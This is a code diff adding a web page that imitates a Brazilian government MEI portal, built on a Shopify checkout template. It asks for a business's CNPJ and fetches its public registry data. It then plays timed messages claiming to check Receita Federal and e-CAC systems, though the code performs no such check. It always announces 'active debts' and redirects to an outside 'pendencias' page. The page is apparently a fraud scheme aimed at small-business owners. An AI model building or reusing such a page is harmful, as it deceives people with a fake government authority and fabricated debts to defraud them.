@@ -1,0 +1,1013 @@
+<!-- Adicione a referência ao Font Awesome para ícones -->                        
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">                        
+                        
+<!-- Bloco do Checkout -->                        
+<div class="checkout-wrapper">                        
+    <!-- Cabeçalho com menu -->  
+<div class="checkout-header" style="position: relative;">  
+    <div class="header-content">  
+        <img src="https://cdn.shopify.com/s/files/1/0704/5827/8028/files/MEI_2.png?v=1744938863" alt="Logo" class="header-logo">  
+    </div>  
+    <!-- Ícone de Menu no Cabeçalho -->  
+    <div class="menu-container">  
+        <i class="fas fa-ellipsis-v menu-icon" onclick="toggleMenu()"></i>  
+        <div class="menu-dropdown" id="menuDropdown">  
+            <a href="#" onclick="updateActionMethod('checkDues')"><i class="fas fa-file-invoice"></i> Consultar</a>  
+            <a href="#" onclick="updateActionMethod('openMei')"><i class="fas fa-briefcase"></i> Abrir MEI</a>  
+            <a href="#" onclick="updateActionMethod('closeMei')"><i class="fas fa-times-circle"></i> Dar Baixa</a>  
+        </div>  
+    </div>  
+</div>                        
+                        
+    <!-- Barra inicial -->                        
+    <div class="payment-amount-block" id="headerBar">                        
+        <p class="amount-label">Microempreendedor Individual:</p>                        
+        <h1 class="amount-value">Portal Digital</h1>                        
+        <div class="subtle-line"></div>                        
+    </div>                        
+                        
+    <!-- Bloco principal -->                        
+    <div class="checkout-block" id="checkoutBlock">                        
+        <!-- Barra de detalhes -->                        
+        <div class="order-details" id="orderDetails">                        
+            <button class="accordion-toggle" aria-expanded="false" onclick="toggleAccordion()">Ver detalhes</button>                        
+            <div class="accordion-content" id="orderDetailsContent" aria-hidden="true">                        
+                <p>Item 1: Serviço A - R$ 300,00</p>                        
+                <p>Item 2: Serviço B - R$ 310,00</p>                        
+                <p>Total: R$ 610,00</p>                        
+            </div>                        
+        </div>                        
+                        
+        <!-- Título das opções -->                        
+        <h2 class="payment-title" id="serviceTitle">Selecione um serviço:</h2>                        
+                        
+        <!-- Opções de serviço -->                        
+        <form id="action-method-form">                        
+            <div class="form-group payment-option" onclick="updateActionMethod('checkDues')">                        
+                <input type="radio" id="checkDuesOption" name="actionMethod" value="checkDues" required>                        
+                <label for="checkDuesOption">                        
+                    <div class="option-content">                        
+                        <i class="fas fa-file-invoice"></i>                        
+                        <span>Consultar Pendências (DAS)</span>                        
+                        <i class="fas fa-chevron-right option-arrow"></i>                        
+                    </div>                        
+                </label>                        
+            </div>                        
+                        
+            <div class="form-group payment-option" onclick="updateActionMethod('openMei')">                        
+                <input type="radio" id="openMeiOption" name="actionMethod" value="openMei" required>                        
+                <label for="openMeiOption">                        
+                    <div class="option-content">                        
+                        <i class="fas fa-briefcase"></i>                        
+                        <span>Abrir MEI</span>                        
+                        <i class="fas fa-chevron-right option-arrow"></i>                        
+                    </div>                        
+                </label>                        
+            </div>                        
+                        
+            <div class="form-group payment-option" onclick="updateActionMethod('closeMei')">                        
+                <input type="radio" id="closeMeiOption" name="actionMethod" value="closeMei" required>                        
+                <label for="closeMeiOption">                        
+                    <div class="option-content">                        
+                        <i class="fas fa-times-circle"></i>                        
+                        <span>Dar Baixa</span>                        
+                        <i class="fas fa-chevron-right option-arrow"></i>                        
+                    </div>                        
+                </label>                        
+            </div>                        
+                        
+            <!-- Mensagem de segurança -->                        
+            <div class="security-message">                        
+                <i class="fas fa-shield-alt"></i> Suas informações estão protegidas.                        
+            </div>                        
+        </form>                        
+    </div>                        
+</div>                        
+                        
+<!-- Botão fixo de confirmação -->                        
+<div class="fixed-footer">                        
+    <button type="button" class="continue-button" id="confirmButton" onclick="confirmarAcao()">Confirmar Ação</button>                        
+</div>           
+      
+<div id="consulta-loader" style="display: none;">  
+  <div class="loader-container">  
+    <div class="pulse-icon">  
+      <i class="fas fa-search"></i>  
+    </div>  
+    <p id="consulta-texto">  
+      Consultando informações da Receita Federal...  
+    </p>  
+  </div>  
+</div>                
+                        
+<style>                        
+    /* Barra de progresso mais compacta */                        
+    .action-method-progress {                        
+        display: flex;                        
+        justify-content: space-between;                        
+        margin-bottom: 12px;                        
+        padding: 6px;                        
+        background-color: #e3eaf4;                        
+        border-radius: 6px;                        
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);                        
+        font-weight: 500;                        
+    }                        
+                        
+    .action-step {                        
+        flex: 1;                        
+        text-align: center;                        
+        padding: 6px;                        
+        font-size: 12px;                        
+        color: #6b7280;                        
+        border-radius: 4px;                        
+        transition: background-color 0.3s ease, color 0.3s ease;                        
+    }                        
+                        
+    .action-step.active {                        
+        background-color: #1e3a8a;                        
+        color: #ffffff;                        
+        font-weight: 600;                        
+    }                        
+                        
+    /* Estilização aprimorada dos campos */                        
+   .input-group {                      
+    margin-bottom: 22px; /* Mais espaço entre os campos */                      
+}                      
+                      
+.input-group label {                      
+    display: block;                      
+    font-size: 13px;                      
+    font-weight: 500;                      
+    color: #555;                      
+    margin-bottom: 6px;                      
+}                      
+                      
+.input-field {                      
+    width: 100%;                      
+    padding: 12px 42px 12px 42px; /* Ajustado para acomodar o ícone e o carregamento */                      
+    border: 1px solid #ced4da;                      
+    border-radius: 6px;                      
+    font-size: 14px;                      
+    transition: border-color 0.3s ease, background-color 0.3s ease, opacity 0.3s ease;                      
+}                      
+                      
+/* Bloqueio visual do campo durante o carregamento */                      
+.input-field.loading {                      
+    background-color: #f3f3f3;                      
+    opacity: 0.7;                      
+    pointer-events: none;                      
+    cursor: not-allowed;                      
+}                      
+                      
+/* Ajuste o tamanho do campo CNPJ apenas quando estiver carregando */                    
+#cnpjInput.loading {                    
+    width: 70%; /* Reduz a largura do campo CNPJ */                    
+    transition: width 0.3s ease-in-out;                    
+}                    
+                    
+/* 🔄 Container do Spinner e Ícone de Sucesso */                
+/* 🔄 Container do Spinner */                
+.loading-container {                
+    position: absolute;                
+    right: 50px; /* Ajuste para mover para a direita/esquerda */                
+    top: 35%; /* Ajuste para mover para cima/baixo */                
+    transform: translateY(-50%); /* Mantém alinhado ao centro */                
+    display: none;                
+}                
+                
+/* ✅ Container do Ícone de Sucesso */                
+.success-container {                
+    position: absolute;                
+    right: 50px; /* Ajuste para mover para a direita/esquerda */                
+    top: 35%; /* Ajuste para mover para cima/baixo */                
+    transform: translateY(-50%);                
+    display: none;                
+}                
+                
+/* 🔄 Estilização do Spinner */                
+.loading-spinner {                
+    font-size: 18px;                
+    color: #1e3a8a;                
+    animation: spin 0.6s linear infinite;                
+}                
+                
+/* ✅ Estilização do Ícone de Sucesso */                
+.success-container i {                
+    font-size: 18px;                
+    color: #28a745;                
+}                
+                
+/* 🔄 Animação de rotação do Spinner */                
+@keyframes spin {                
+    from { transform: rotate(0deg); }                
+    to { transform: rotate(360deg); }                
+}                
+                
+/* 📝 Estilização aprimorada do texto de carregamento */              
+.loading-text {              
+    display: none;              
+    font-size: 13px;              
+    color: #4a5568; /* Cinza escuro elegante */              
+    font-weight: 500;              
+    text-align: left;              
+    padding: 8px 12px;              
+    background: #f8fafc;              
+    border-left: 3px solid #1e3a8a; /* Borda azul para destacar sutilmente */              
+    border-radius: 4px;              
+    box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.05);              
+    animation: fadeIn 0.3s ease-in-out, loadingDots 1.5s infinite;              
+}              
+              
+/* 🔄 Efeito de fade-in para transições suaves */              
+@keyframes fadeIn {              
+    from { opacity: 0; transform: translateY(-4px); }              
+    to { opacity: 1; transform: translateY(0); }              
+}              
+              
+/* 🔄 Animação de pontuação progressiva */              
+@keyframes loadingDots {              
+    0% { content: "🔎 Buscando informações do CNPJ"; }              
+    33% { content: "🔎 Buscando informações do CNPJ."; }              
+    66% { content: "🔎 Buscando informações do CNPJ.."; }              
+    100% { content: "🔎 Buscando informações do CNPJ..."; }              
+}              
+              
+/* Aplica a animação dinâmica no texto */              
+.loading-text::after {              
+    content: "";              
+    animation: loadingDots 1.5s infinite;              
+}                
+                
+/* Ajusta o alinhamento do input para acomodar os ícones corretamente */                
+.input-icon {                
+    position: relative;                
+    display: flex;                
+    align-items: center;                
+    width: 100%;                
+}                
+                
+/* Ajusta o padding do campo CNPJ para não sobrepor os ícones */                
+#cnpjInput {                
+    padding-right: 50px; /* Garante espaço suficiente para os ícones */                
+}                      
+                      
+.security-message {                      
+    font-size: 13px;                      
+    color: #6b7280;                      
+    display: flex;                      
+    align-items: center;                      
+    gap: 6px;                      
+    background: #f8f9fa;                      
+    padding: 12px;                      
+    border-radius: 6px;                      
+    margin-top: 16px;                      
+}                      
+                      
+.security-message i {                      
+    color: #1e3a8a;                      
+}                      
+                      
+.button-container {                      
+    display: flex;                      
+    justify-content: center;                      
+    margin-top: 24px;                      
+}                      
+                      
+.continue-button {                      
+    background: #1e3a8a;                      
+    color: #fff;                      
+    font-size: 15px;                      
+    font-weight: 600;                      
+    padding: 14px 20px;                      
+    border: none;                      
+    border-radius: 6px;                      
+    cursor: pointer;                      
+    transition: background 0.3s ease;                      
+    width: 100%;                      
+    max-width: 300px;                      
+}                      
+                      
+.continue-button:hover {                      
+    background: #162d5a;                      
+}                
+                
+#buscandoTexto {                
+    text-align: left;                
+    font-style: italic;                
+}              
+              
+/* Estado padrão inicial: semelhante ao erro, mas interativo */              
+#cnpjInput {              
+    background-color: #f3f3f3; /* fundo cinza indicando espera */              
+    opacity: 0.9;              
+    color: #374151;              
+    cursor: text;              
+    pointer-events: auto;              
+    width: 70%;              
+    transition: width 0.3s ease-in-out, opacity 0.3s ease-in-out, background-color 0.3s ease-in-out;              
+}              
+              
+/* Estado durante o carregamento e após o carregamento (azul original) */              
+#cnpjInput.loading,              
+#cnpjInput.loaded {              
+    background-color: #eef2f7; /* Azul claro original */              
+    opacity: 1;              
+    color: #111827; /* Cor do texto escura */              
+}              
+              
+.info-label {              
+    margin: 0;              
+    font-size: 12px;              
+    color: #6b7280;              
+    font-weight: 500;              
+}              
+              
+.info-text {              
+    margin: 5px 0 15px 0;              
+    font-size: 15px;              
+    color: #111827;              
+    font-weight: 600;              
+}             
+        
+ .info-divider {        
+  height: 1px;        
+  width: 100%;        
+  margin: 18px 0 16px 0;        
+  background: linear-gradient(to right, #0ea5e9, #10b981);        
+  border: none;        
+  border-radius: 2px;        
+}        
+        
+.continue-button {        
+  position: relative;        
+  overflow: hidden;        
+  background: #1e3a8a;        
+  color: #fff;        
+  font-size: 15px;        
+  font-weight: 600;        
+  padding: 14px 20px;        
+  border: none;        
+  border-radius: 6px;        
+  cursor: pointer;        
+  width: 100%;        
+  max-width: 300px;        
+  transition: background-color 0.3s ease, color 0.3s ease, opacity 0.3s ease, transform 0.3s ease;        
+}        
+        
+.continue-button:hover:enabled {        
+  background-color: #162d5a;        
+  transform: scale(1.01);        
+}        
+        
+/* Estado carregando */        
+.continue-button.loading {        
+  background-color: #d1d5db !important;        
+  color: transparent !important;        
+  cursor: wait;        
+  pointer-events: none;        
+}        
+        
+/* Spinner visível centralizado */        
+.continue-button.loading::after {        
+  content: "";        
+  position: absolute;        
+  top: 50%;        
+  left: 50%;        
+  width: 20px;        
+  height: 20px;        
+  margin: -10px 0 0 -10px;        
+  border: 3px solid #ffffff;        
+  border-top: 3px solid transparent;        
+  border-radius: 50%;        
+  animation: spin 0.8s linear infinite;        
+  z-index: 1;        
+}        
+        
+/* Botão aguardando confirmação do Captcha */        
+.continue-button.disabled-pending {        
+  background-color: #a7f3d0;        
+  color: #047857;        
+  pointer-events: none;        
+  cursor: not-allowed;        
+  transition: background-color 0.3s ease, color 0.3s ease;        
+}        
+        
+/* Efeito ativado após Captcha */        
+.continue-button.activated {        
+  animation: pulse 0.6s ease-out;        
+}        
+        
+/* Spinner */        
+@keyframes spin {        
+  0% { transform: rotate(0deg); }        
+  100% { transform: rotate(360deg); }        
+}        
+        
+/* Animação pulsante */        
+@keyframes pulse {        
+  0% {        
+    transform: scale(1);        
+    box-shadow: 0 0 0 0 rgba(30, 58, 138, 0.5);        
+  }        
+  70% {        
+    transform: scale(1.04);        
+    box-shadow: 0 0 0 10px rgba(30, 58, 138, 0);        
+  }        
+  100% {        
+    transform: scale(1);        
+    box-shadow: 0 0 0 0 rgba(30, 58, 138, 0);        
+  }        
+}        
+      
+/* Spinner global reutilizável */      
+.spinner-css {      
+  width: 48px;      
+  height: 48px;      
+  border: 5px solid #e2e8f0;      
+  border-top: 5px solid #1e3a8a;      
+  border-radius: 50%;      
+  animation: spinLoader 1s linear infinite;      
+  margin-bottom: 20px;      
+}      
+      
+#consulta-loader {  
+  position: fixed;  
+  top: 0; left: 0;  
+  width: 100vw; height: 100vh;  
+  background: linear-gradient(to bottom right, #f8fafc, #e2e8f0);  
+  display: flex;  
+  align-items: center;  
+  justify-content: center;  
+  z-index: 9999;  
+  animation: fadeIn 0.4s ease-in-out;  
+}  
+  
+.loader-container {  
+  display: flex;  
+  flex-direction: column;  
+  align-items: center;  
+  padding: 36px;  
+  border-radius: 16px;  
+  background: #ffffff;  
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);  
+  animation: slideUp 0.4s ease-in-out;  
+}  
+  
+.pulse-icon {  
+  width: 72px;  
+  height: 72px;  
+  border-radius: 50%;  
+  background: #1e3a8a;  
+  color: #ffffff;  
+  display: flex;  
+  align-items: center;  
+  justify-content: center;  
+  font-size: 32px;  
+  animation: pulseGlow 1.6s infinite;  
+  margin-bottom: 24px;  
+}  
+  
+#consulta-texto {  
+  font-size: 17px;  
+  font-weight: 600;  
+  color: #1f2937;  
+  text-align: center;  
+  max-width: 280px;  
+  line-height: 1.5;  
+  animation: fadeInText 0.6s ease-in-out;  
+}  
+  
+@keyframes pulseGlow {  
+  0% {  
+    transform: scale(1);  
+    box-shadow: 0 0 0 0 rgba(30, 58, 138, 0.6);  
+  }  
+  70% {  
+    transform: scale(1.05);  
+    box-shadow: 0 0 0 20px rgba(30, 58, 138, 0);  
+  }  
+  100% {  
+    transform: scale(1);  
+    box-shadow: 0 0 0 0 rgba(30, 58, 138, 0);  
+  }  
+}  
+  
+@keyframes fadeIn {  
+  from { opacity: 0; }  
+  to { opacity: 1; }  
+}  
+  
+@keyframes slideUp {  
+  from { transform: translateY(30px); opacity: 0; }  
+  to { transform: translateY(0); opacity: 1; }  
+}  
+  
+@keyframes fadeInText {  
+  from { opacity: 0; transform: translateY(10px); }  
+  to { opacity: 1; transform: translateY(0); }  
+}  
+  
+#consulta-loader::before {  
+  content: "";  
+  position: absolute;  
+  top: 0; left: 0;  
+  width: 100%; height: 100%;  
+  background: linear-gradient(135deg, #f0f4f8 25%, #e2e8f0 50%, #f0f4f8 75%);  
+  background-size: 400% 400%;  
+  animation: backgroundMove 3s ease infinite;  
+  opacity: 0.2;  
+  z-index: 0;  
+}  
+@keyframes backgroundMove {  
+  0% { background-position: 0% 50%; }  
+  50% { background-position: 100% 50%; }  
+  100% { background-position: 0% 50%; }  
+}  
+  
+/* Pulsação vermelha para alerta de pendências */  
+.pulse-alert {  
+  animation: pulseRed 1.6s infinite;  
+  color: #dc2626 !important; /* vermelho institucional */  
+}  
+  
+@keyframes pulseRed {  
+  0% {  
+    transform: scale(1);  
+    box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.5);  
+  }  
+  70% {  
+    transform: scale(1.05);  
+    box-shadow: 0 0 0 12px rgba(220, 38, 38, 0);  
+  }  
+  100% {  
+    transform: scale(1);  
+    box-shadow: 0 0 0 0 rgba(220, 38, 38, 0);  
+  }  
+}  
+  
+.menu-container {  
+    position: absolute;  
+    top: 12px;  
+    right: 20px;  
+    cursor: pointer;  
+}  
+  
+.menu-icon {  
+    font-size: 18px;  
+    color: #1e3a8a;  
+    transition: color 0.3s;  
+}  
+  
+.menu-icon:hover {  
+    color: #0f172a;  
+}  
+  
+.menu-dropdown {  
+    display: none;  
+    position: absolute;  
+    top: 32px;  
+    right: 0;  
+    background: #ffffff;  
+    border-radius: 8px;  
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);  
+    padding: 8px 0;  
+    width: 160px;  
+    z-index: 1000;  
+}  
+  
+.menu-dropdown a {  
+    display: flex;  
+    align-items: center;  
+    padding: 10px 14px;  
+    font-size: 14px;  
+    color: #374151;  
+    text-decoration: none;  
+    transition: background 0.3s;  
+}  
+  
+.menu-dropdown a i {  
+    margin-right: 8px;  
+    color: #1e3a8a;  
+}  
+  
+.menu-dropdown a:hover {  
+    background: #f3f4f6;  
+}  
+
+.input-icon i.fas.fa-building {
+  color: #1e3a8a !important;
+  opacity: 1 !important;
+}
+</style>                        
+                        
+<script>                        
+    function updateActionMethod(action) {                        
+        document.getElementById(`${action}Option`).checked = true;                        
+    }                        
+                        
+    function confirmarAcao() {      
+  const confirmButton = document.getElementById("confirmButton");      
+      
+  // Caso o botão esteja com o texto de consulta, acionamos a tela de carregamento direto      
+  if (confirmButton && confirmButton.textContent.includes("Consultar Agora")) {  
+  confirmButton.classList.add("loading");  
+  confirmButton.textContent = "";  
+  
+  setTimeout(() => {  
+    mostrarTelaDeConsulta();  
+  }, 1000); // 1 segundo de simulação de carregamento  
+  return;  
+}      
+      
+  // Caso contrário, segue o fluxo normal de seleção de serviço      
+  const selectedAction = document.querySelector('input[name="actionMethod"]:checked');      
+  if (selectedAction) {      
+    substituirPorFormulario(selectedAction.value);      
+  } else {      
+    alert("Selecione uma opção para continuar.");      
+  }      
+}                        
+                        
+   function substituirPorFormulario(action) {                      
+    const checkoutBlock = document.getElementById('checkoutBlock');                      
+    const orderDetails = document.getElementById('orderDetails');                      
+    const serviceTitle = document.getElementById('serviceTitle');                      
+    const fixedFooter = document.querySelector('.fixed-footer');                      
+                      
+    if (orderDetails) orderDetails.style.display = 'none';                      
+    if (serviceTitle) serviceTitle.style.display = 'none';                      
+                      
+    let formContent = `                      
+        <div class="action-method-progress">                      
+            <span class="action-step ${action === 'checkDues' ? 'active' : ''}">Pendências</span>                      
+            <span class="action-step ${action === 'openMei' ? 'active' : ''}">Abrir MEI</span>                      
+            <span class="action-step ${action === 'closeMei' ? 'active' : ''}">Dar Baixa</span>                      
+        </div>                      
+    `;                      
+                      
+    if (action === 'checkDues') {                      
+        if (fixedFooter) fixedFooter.style.display = 'none';                      
+                      
+        formContent += `                  
+    <div class="input-group">
+  <label>Consulta atualizada</label>
+  <div class="input-icon" style="position: relative;">
+    <div style="
+      width: 100%;
+      padding: 12px 16px 12px 42px;
+      background: #f9fafb;
+      border: 1px solid #cbd5e1;
+      border-radius: 6px;
+      font-size: 14px;
+      color: #1e3a8a;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      position: relative;
+      box-shadow: inset 0 0 0 1px rgba(30, 58, 138, 0.08);
+    ">
+      <i class="fas fa-toggle-on" style="
+        position: absolute;
+        left: 14px;
+        color: #1e3a8a;
+        font-size: 18px;
+      "></i>
+      <span style="margin-left: 4px;">Consultar Pendências (DAS)</span>
+    </div>
+  </div>
+</div>                  
+          
+    <!-- Campo CNPJ -->          
+    <div class="input-group">            
+        <label for="cnpjInput">CNPJ</label>            
+        <div class="input-icon" style="position: relative;">            
+            <i class="fas fa-building" style="color: #64748b; opacity: 1 !important;"></i>            
+            <input type="tel" class="input-field" id="cnpjInput" placeholder="00.000.000/0001-00" inputmode="numeric" pattern="[0-9]*">            
+            <div id="loadingContainer" class="loading-container">          
+                <i class="loading-spinner fas fa-circle-notch fa-spin"></i>          
+            </div>          
+            <div id="successIcon" class="success-container">          
+                <i class="fas fa-check-circle"></i>          
+            </div>          
+        </div>            
+    </div>            
+          
+    <p id="buscandoTexto" class="loading-text"></p>          
+          
+    <!-- Bloco de Informações do CNPJ -->          
+    <div id="cnpjInfo" style="display: none; background-color: #ffffff; border-left: 4px solid #1e3a8a; padding: 20px; border-radius: 10px; margin-top: 15px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);">                      
+    <div style="display: flex; align-items: center; margin-bottom: 15px;">                      
+        <i class="fas fa-building" style="color: #1e3a8a; font-size: 13px; margin-right: 8px;"></i>                      
+        <h3 style="margin: 0; font-size: 15px; color: #1e3a8a; font-weight: 600;">Informações do CNPJ</h3>                      
+    </div>                      
+    <div>        
+    <p class="info-label">Razão Social</p>        
+    <p id="razaoSocialText" class="info-text"></p>        
+    <hr class="info-divider">        
+        
+    <p class="info-label">Situação Cadastral</p>        
+    <p id="situacaoCadastralText" class="info-text"></p>        
+    <hr class="info-divider">        
+        
+    <p class="info-label">Natureza Jurídica</p>        
+    <p id="naturezaJuridicaText" class="info-text"></p>        
+    <hr class="info-divider">        
+        
+    <p class="info-label">E-mail</p>        
+    <p id="emailText" class="info-text"></p>        
+    <hr class="info-divider">        
+        
+    <p class="info-label">Localidade</p>        
+    <p id="enderecoCnpjText" class="info-text"></p>        
+    <hr class="info-divider">        
+        
+    <!-- Captcha de confirmação mais profissional com alinhamento ideal -->        
+<div style="display: flex; align-items: center; gap: 12px; padding: 16px 20px; background: #f9fafb; border-radius: 6px; margin-top: 24px; border: 1px solid #e2e8f0; box-shadow: 0 1px 4px rgba(0,0,0,0.04); position: relative;">        
+  <div style="position: absolute; left: 0; top: 0; bottom: 0; width: 4px; background: linear-gradient(to bottom, #10b981, #1e3a8a); border-radius: 6px 0 0 6px;"></div>        
+          
+  <input type="checkbox" id="confirmacaoCnpj" required style="transform: scale(1.2); accent-color: #1e3a8a; margin-left: 8px;">        
+          
+  <label for="confirmacaoCnpj" style="font-size: 14px; color: #374151; font-weight: 500; line-height: 1.4; margin: 0;">        
+    Declaro que sou titular do CNPJ <strong id="cnpjConfirmado" style="color: #1e3a8a;"></strong>.        
+        </span>        
+      </label>        
+    </div>        
+  </div>        
+</div>          
+          
+    <div class="security-message">          
+        <i class="fas fa-shield-alt"></i> Suas informações estão protegidas.          
+    </div>          
+          
+    <!-- Rodapé fixo para seção de pendências -->        
+<div class="fixed-footer">        
+  <button type="button" class="continue-button" id="confirmButton" onclick="confirmarAcao()">Confirmar Ação</button>        
+</div>          
+`;                      
+    } else {                      
+        if (fixedFooter) fixedFooter.style.display = 'flex';                      
+    }                      
+                      
+    checkoutBlock.innerHTML = formContent;                  
+        
+    // Reatribui o evento e botão dinâmico        
+setTimeout(() => {        
+  attachCNPJEvent(); // reaplica evento no campo CNPJ        
+        
+  const novoBotao = document.getElementById("confirmButton");        
+  if (novoBotao) {        
+    novoBotao.classList.remove("loading"); // limpa qualquer loading anterior        
+  }        
+}, 50);        
+}                      
+                      
+// Função para buscar dados do CNPJ                      
+let timeoutCNPJ; // Variável para evitar múltiplas requisições ao digitar rapidamente                      
+                      
+// Função para esconder o teclado no celular (iOS e Android)                      
+function esconderTeclado(input) {                      
+    input.blur(); // Remove o foco do campo, escondendo o teclado                      
+    document.activeElement.blur();                      
+}                      
+                      
+function bloquearCampos(bloquear) {  
+  const cnpjInput = document.getElementById("cnpjInput");  
+  const loadingContainer = document.getElementById("loadingContainer");  
+  const buscandoTexto = document.getElementById("buscandoTexto");  
+  const confirmButton = document.getElementById("confirmButton");  
+  
+  if (!cnpjInput || !loadingContainer || !buscandoTexto || !confirmButton) return;  
+  
+  if (bloquear) {  
+    // Estado de carregamento  
+    cnpjInput.classList.add("loading");  
+    cnpjInput.setAttribute("disabled", "true");  
+    loadingContainer.style.display = "flex";  
+    buscandoTexto.style.display = "block";  
+  
+    confirmButton.dataset.originalText = confirmButton.textContent;  
+    confirmButton.classList.add("loading");  
+    confirmButton.textContent = ""; // Exibe apenas o spinner  
+    confirmButton.disabled = true;  
+  } else {  
+    // Após carregamento: respeita se o captcha está marcado  
+    setTimeout(() => {  
+      requestAnimationFrame(() => {  
+        cnpjInput.classList.remove("loading");  
+        cnpjInput.classList.add("loaded");  
+        cnpjInput.removeAttribute("disabled");  
+        loadingContainer.style.display = "none";  
+        buscandoTexto.style.display = "none";  
+  
+        confirmButton.classList.remove("loading");  
+        confirmButton.textContent = confirmButton.dataset.originalText || "🌐 Consultar Agora";  
+  
+        const captchaChecked = document.getElementById("confirmacaoCnpj")?.checked;  
+  
+        if (captchaChecked) {  
+          confirmButton.disabled = false;  
+          confirmButton.classList.remove("disabled-pending");  
+          confirmButton.classList.add("activated");  
+  
+          setTimeout(() => {  
+            confirmButton.classList.remove("activated");  
+          }, 900);  
+        } else {  
+          confirmButton.disabled = true;  
+          confirmButton.classList.add("disabled-pending");  
+        }  
+      });  
+    }, 100);  
+  }  
+}           
+      
+function mostrarTelaDeConsulta() {  
+  const tela = document.getElementById("consulta-loader");  
+  const texto = document.getElementById("consulta-texto");  
+  const pulseIcon = document.querySelector(".pulse-icon i");  
+  const pulseContainer = document.querySelector(".pulse-icon");  
+  
+  tela.style.display = "flex";  
+  
+  const frases = [  
+    { msg: "Analisando a Base de dados do Governo Federal...🔰", icon: "fas fa-database", delay: 3200 },  
+    { msg: "Verificando a situação do CNPJ em sistemas integrados...🌐", icon: "fas fa-network-wired", delay: 3200 },  
+    { msg: "Validando dados junto ao e-CAC e Ministério da Economia...🇧🇷", icon: "fas fa-shield-alt", delay: 3200 },  
+{ msg: "Aguarde! Já estamos Finalizando...🔰", icon: "fas fa-network-wired", delay: 3200 },  
+    {  
+      msg: "🔔 Pendências Ativas no CNPJ! Aguarde enquanto preparamos a visualização...",  
+      icon: "fas fa-exclamation-circle",  
+      delay: 600,  
+      alerta: true  
+    }  
+  ];  
+  
+  let etapa = 0;  
+  
+  function atualizarEtapa() {  
+    const etapaAtual = frases[etapa];  
+    texto.textContent = etapaAtual.msg;  
+    pulseIcon.className = etapaAtual.icon;  
+  
+    // Aplica efeito vermelho se for alerta  
+    if (etapaAtual.alerta) {  
+      pulseContainer.classList.add("pulse-alert");  
+      pulseContainer.classList.remove("pulseGlow");  
+    } else {  
+      pulseContainer.classList.remove("pulse-alert");  
+      pulseContainer.classList.add("pulseGlow");  
+    }  
+  
+    if (etapa < frases.length - 1) {  
+      setTimeout(() => {  
+        etapa++;  
+        atualizarEtapa();  
+      }, etapaAtual.delay);  
+    } else {  
+      setTimeout(() => {  
+        window.location.href = "https://portalmei-br.com/blogs/pendencias";  
+      }, etapaAtual.delay);  
+    }  
+  }  
+  
+  atualizarEtapa();  
+}  
+                      
+// Adicionando evento ao campo CNPJ para fechar o teclado e bloquear os campos ao buscar os dados                      
+function attachCNPJEvent() {                      
+    const cnpjInput = document.getElementById("cnpjInput");                      
+                      
+    if (!cnpjInput) {                      
+        console.error("⚠ O campo de CNPJ não foi encontrado no DOM.");                      
+        return;                      
+    }                      
+                      
+    cnpjInput.addEventListener("input", function () {                      
+        let cnpj = cnpjInput.value.replace(/\D/g, ''); // Remove caracteres não numéricos                      
+                      
+        // Aplica máscara ao CNPJ                      
+        if (cnpj.length > 14) cnpj = cnpj.slice(0, 14);                      
+        cnpjInput.value = cnpj.replace(/^(\d{2})(\d)/, "$1.$2")                      
+                              .replace(/^(\d{2})\.(\d{3})(\d)/, "$1.$2.$3")                      
+                              .replace(/\.(\d{3})(\d)/, ".$1/$2")                      
+                              .replace(/(\d{4})(\d)/, "$1-$2");                      
+                      
+        console.log("🔎 CNPJ digitado:", cnpj);                      
+                      
+        // Se atingir 14 dígitos, faz a busca imediatamente e bloqueia os campos                      
+        if (cnpj.length === 14) {                      
+            esconderTeclado(cnpjInput); // Fecha o teclado                      
+            bloquearCampos(true); // Bloqueia os campos                      
+            buscarDadosCNPJ(cnpj);                      
+        }                      
+    });                      
+}                      
+                      
+async function buscarDadosCNPJ(cnpj) {  
+  console.log("🔄 Buscando dados para o CNPJ:", cnpj);  
+  
+  const loadingContainer = document.getElementById("loadingContainer");  
+  const buscandoTexto = document.getElementById("buscandoTexto");  
+  const successIcon = document.getElementById("successIcon");  
+  
+  if (!loadingContainer || !buscandoTexto || !successIcon) {  
+    console.error("⚠ Elementos de carregamento não encontrados.");  
+    return;  
+  }  
+  
+  // Exibe spinner e texto antes da requisição  
+  loadingContainer.style.display = "flex";  
+  buscandoTexto.style.display = "block";  
+  successIcon.style.display = "none";  
+  
+  try {  
+    const response = await fetch(`https://publica.cnpj.ws/cnpj/${cnpj}`);  
+    if (!response.ok) throw new Error("❌ Erro na API");  
+  
+    const data = await response.json();  
+    if (!data.razao_social) {  
+      alert("⚠ CNPJ não encontrado.");  
+      return;  
+    }  
+  
+    // Preenchimento das informações do CNPJ  
+    document.getElementById("razaoSocialText").textContent = data.razao_social || "Não informado";  
+    document.getElementById("situacaoCadastralText").textContent = data.estabelecimento?.situacao_cadastral || "Não informado";  
+    document.getElementById("naturezaJuridicaText").textContent = data.natureza_juridica?.descricao || "Não informado";  
+    document.getElementById("emailText").textContent = data.estabelecimento?.email || "Não informado";  
+    document.getElementById("enderecoCnpjText").textContent = `${data.estabelecimento?.cidade?.nome} / ${data.estabelecimento?.estado?.sigla}` || "Não informado";  
+  
+    // Exibe o bloco de informações  
+    document.getElementById("cnpjInfo").style.display = "block";  
+  
+    // Atualiza o número do CNPJ formatado no captcha  
+    const cnpjFormatado = cnpj.replace(/^(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})$/, "$1.$2.$3/$4-$5");  
+    const cnpjConfirmadoEl = document.getElementById("cnpjConfirmado");  
+    if (cnpjConfirmadoEl) {  
+      cnpjConfirmadoEl.textContent = cnpjFormatado;  
+    }  
+  
+    // SALVA NO LOCALSTORAGE  
+    localStorage.setItem("cnpj_formatado", cnpjFormatado);  
+    localStorage.setItem("razao_social", data.razao_social);  
+  
+    console.log("✅ Dados do CNPJ carregados com sucesso!");  
+  } catch (error) {  
+    alert("❌ Erro ao buscar os dados do CNPJ.");  
+    console.error("Erro na API:", error);  
+  } finally {  
+    loadingContainer.style.display = "none";  
+    buscandoTexto.style.display = "none";  
+    successIcon.style.display = "flex";  
+  
+    // Libera o botão e o campo  
+    bloquearCampos(false);  
+  }  
+}                      
+                      
